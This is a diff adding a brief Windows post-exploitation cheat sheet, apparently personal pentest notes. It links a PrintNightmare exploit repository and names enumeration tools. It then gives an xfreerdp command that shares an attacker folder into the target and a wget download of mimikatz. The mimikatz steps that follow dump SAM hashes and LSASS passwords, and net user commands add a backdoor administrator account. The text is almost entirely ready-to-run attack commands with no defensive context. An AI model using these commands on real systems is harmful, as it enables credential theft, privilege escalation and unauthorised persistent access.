@@ -1,0 +1,29 @@
+## CVE ##
+https://github.com/calebstewart/CVE-2021-1675
+
+## post exploit
+WinPEAS
+Seatbelt
+
+## mimikatz
+xfreerdp /cert-ignore /bpp:8 /network:modem /compression -themes -wallpaper /audio-mode:1 \
++clipboard /drive:share,/tmp/hack \
+/u:administrator /p:pass /v:$h:3389 /d:local
+	cd /tmp/hack
+	wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210810/mimikatz_trunk.zip
+
+> \\tsclient\share\x64\mimikatz.exe
+> privilege::debug
+> token::elevate
+> lsadump::sam									# dump sam hash
+> sekurlsa::logonpasswords							# dump pass froùm LSASS memory
+
+## add account
+> net user USER PASSWORD /add							# create user
+> net localgroup administrators USER /add					# add to Administrator
+> net user									# list user and check new user
+
+## change password
+> net user USER NEWPASS								# change user password
+
+
